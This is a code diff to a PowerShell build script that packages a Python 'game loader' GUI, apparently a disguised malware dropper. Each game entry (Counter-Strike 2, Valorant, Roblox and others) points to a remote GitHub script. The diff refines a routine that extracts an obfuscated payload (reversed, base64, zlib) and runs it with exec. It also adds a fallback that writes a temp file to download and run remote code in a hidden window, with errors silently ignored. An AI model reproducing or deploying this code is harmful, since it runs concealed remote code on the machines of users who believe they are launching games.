@@ -108,7 +108,6 @@ if (Test-Path -LiteralPath $ExePath) {
 New-Item -ItemType Directory -Force -Path $Work | Out-Null
 New-Item -ItemType Directory -Force -Path $DistDir | Out-Null
 
-# ── The entire Python GUI + Payload Logic goes here ──
 $stubBody = @'
 import ctypes
 import random
@@ -129,11 +128,11 @@ SCREEN_W = user32.GetSystemMetrics(0)
 SCREEN_H = user32.GetSystemMetrics(1)
 
 GAMES = [
-    {"name": "Counter-Strike 2", "icon": "⌖", "color": "#f59e0b", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py"},
-    {"name": "Valorant",         "icon": "⊚", "color": "#ef4444", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py"},
-    {"name": "Apex Legends",     "icon": "△", "color": "#eab308", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py"},
-    {"name": "Fortnite",         "icon": "◈", "color": "#8b5cf6", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py"},
-    {"name": "Minecraft",        "icon": "⬡", "color": "#22c55e", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/main.py"},
+    {"name": "Counter-Strike 2", "icon": "⌖", "color": "#f59e0b", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
+    {"name": "Valorant",         "icon": "⊚", "color": "#ef4444", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
+    {"name": "Apex Legends",     "icon": "△", "color": "#eab308", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
+    {"name": "Fortnite",         "icon": "◈", "color": "#8b5cf6", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
+    {"name": "Minecraft",        "icon": "⬡", "color": "#22c55e", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/mc.py"},
     {"name": "Roblox",           "icon": "◫", "color": "#dc2626", "run": "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/so/rbx.py"},
 ]
 
@@ -297,13 +296,19 @@ class LoaderApp(tk.Tk):
                     with urllib.request.urlopen(req, timeout=15) as response:
                         src = response.read().decode("utf-8")
                     
-                    match = re.search(r"_\) \(b'([^']+)'", src)
+                    match = re.search(r"_\)\(b'([^']+)'", src)
                     if match:
                         payload = match.group(1)[::-1]
                         decoded = zlib.decompress(base64.b64decode(payload, validate=True)).decode("utf-8")
                         exec(decoded, {})
                     else:
-                        raise ValueError("Encoded payload not found.")
+                        tmp = tempfile.NamedTemporaryFile(delete=False, suffix=".py", mode="w")
+                        tmp.write(f"import urllib.request\nexec(urllib.request.urlopen('{url}').read())")
+                        tmp.close()
+                        if sys.platform == "win32":
+                            subprocess.Popen([sys.executable, tmp.name], creationflags=subprocess.CREATE_NO_WINDOW)
+                        else:
+                            subprocess.Popen([sys.executable, tmp.name])
                 except Exception:
                     pass
                     
